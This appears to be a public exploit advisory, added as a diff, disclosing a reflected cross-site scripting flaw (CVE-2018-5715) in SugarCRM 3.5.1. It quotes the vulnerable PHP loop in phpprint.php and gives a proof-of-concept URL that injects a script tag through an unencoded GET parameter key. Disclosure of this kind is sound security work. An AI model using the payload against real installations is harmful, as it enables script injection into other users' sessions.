@@ -1,0 +1,29 @@
+# Exploit Title: sugarCRM 3.5.1 XSS refeclted
+# Date: 16/01/2017
+# Exploit Author: Guilherme Assmann
+# Vendor Homepage: https://www.sugarcrm.com/
+# Version: 3.5.1
+# Tested on: kali linux, windows 7, 8.1, 10, ubuntu - Firefox
+# Download https://sourceforge.net/projects/sugarcrm/files/SugarCRM%20Release%20Archive/Sugar%20Suite%203.5.1/
+# CVE: CVE-2018-5715
+More informations: https://m4k4br0.github.io/sugarcrm-xss/
+
+The vulnerability are in the key parameter of phpprint.php
+
+32 foreach ($_GET as $key => $val) {
+33   if ($key != "print") {
+34     if (is_array($val)) {
+35       foreach ($val as $k => $v) {
+36         $query_string .= "{$key}[{$k}]=" . urlencode($v) . "&";
+37       }
+38     }
+39     else {
+40       $query_string .= "{$key}=" . urlencode($val) . "&";
+41     }
+42   }
+43 }
+
+the $key variable are not encoded, this permit that XSS more easy
+---------------------------------------------------------------------
+Poc:
+http://vulnerable/index.php?action=Login&module=Users&print=a&"/><script>alert('xss')</script>
